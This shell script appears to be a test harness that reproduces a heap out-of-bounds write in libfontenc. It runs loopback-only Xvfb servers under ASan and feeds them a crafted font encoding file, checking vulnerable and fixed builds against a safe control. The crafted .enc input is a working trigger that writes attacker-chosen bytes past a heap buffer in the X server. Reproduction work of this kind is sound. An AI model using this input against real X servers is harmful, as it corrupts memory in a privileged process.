#!/bin/sh
# Drive the crafted encoding through a LIVE X server process.
# A client opens a Type1 font whose XLFD charset is "crafted-1"; libXfont2
# calls FontEncFind(), which reads fonts/encodings.dir and the crafted .enc
# from a loopback-only Xvfb font path.  ASan is preloaded ahead of the pinned
# libfontenc build so the in-server heap write is reported from OpenFont.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
BASE=$(CDPATH= cd -- "$HERE/../.." && pwd)
OUT="$HERE/logs"
FONTS="$HERE/type1fonts"
ASANLIB=$(cc -print-file-name=libasan.so)
XLFD='-urw-nimbus mono ps-regular-r-normal--0-0-0-0-p-0-crafted-1'
mkdir -p "$OUT"

run_case() { # variant case display
    variant=$1; casename=$2; disp=$3
    logpfx="$OUT/asan-$variant-$casename"
    rm -f "$logpfx".*
    ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:log_path=$logpfx" \
    LD_PRELOAD="$ASANLIB:$BASE/build-$variant/out-asan/libfontenc.so.1.0.0" \
    Xvfb ":$disp" -screen 0 640x480x24 -nolisten tcp -noreset -fp "$FONTS" \
        > "$OUT/xvfb-$variant-$casename.out" 2>&1 &
    pid=$!
    sleep 3
    rc=0
    DISPLAY=":$disp" "$HERE/xfon-load" ":$disp" "$XLFD" \
        > "$OUT/client-$variant-$casename.out" 2>&1 || rc=$?
    sleep 1
    kill "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
    asan=$(ls "$logpfx".* 2>/dev/null | wc -l)
    summary=$(sed -n '2p' "$OUT/client-$variant-$casename.out")
    printf '%s %s client_rc=%s asan_logs=%s %s\n' \
        "$variant" "$casename" "$rc" "$asan" "$summary"
}

# Safe control: in-bounds index 255, same chosen two bytes.
printf 'STARTENCODING crafted-1\nSIZE 256 256\nSTARTMAPPING unicode\n0x00ff 0x5a5a\nENDMAPPING\nENDENCODING\n' > "$FONTS/crafted-1.enc"
run_case vuln safe 91
run_case fixed safe 92

# Attack input: index 65790, two chosen bytes 508 past the 131072-byte buffer.
printf 'STARTENCODING crafted-1\nSIZE 256 258\nSTARTMAPPING unicode\n0xff00 0x5a5a\nENDMAPPING\nENDENCODING\n' > "$FONTS/crafted-1.enc"
run_case vuln crafted 93
run_case fixed crafted 94
run_case 1.1.9 crafted 95
run_case 1.1.10 crafted 96
